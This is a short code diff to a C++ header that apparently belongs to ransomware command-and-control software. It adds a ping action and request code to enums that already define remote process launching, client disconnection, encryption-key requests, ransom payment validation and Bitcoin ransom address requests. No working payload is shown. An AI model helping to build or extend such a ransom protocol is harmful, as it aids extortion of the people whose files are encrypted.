@@ -16,6 +16,7 @@ enum RemoteAction {
     USE_CLI             = 1,
     OPEN_REMOTE_PROCESS = 4,
     KILL_CLIENT         = 5, // forcefully disconnect the client
+    PING_CLIENT = 6,
 };
 
 enum SocketTypes {
@@ -44,7 +45,7 @@ typedef struct {
 */
 struct ClientResponse {
     std::string        message;         // String message, detailed info on the error or action
-    ClientResponseCode responseCode;    
+    ClientResponseCode responseCode = C_ERROR;    
     RemoteAction       actionPerformed; // ( if any, otherwise put NONE )
 };
 
@@ -100,6 +101,7 @@ typedef struct {
         REQUEST_PUBLIC_ENCRYPTION_KEY = 0x200000,
         VALIDATE_RANSOM_PAYMENT = 0x300000,
         REQUEST_RANSOM_BTC_ADDRESS = 0x400000,
+        PING = 0x500000,
     };
 
     BOOL              valid;
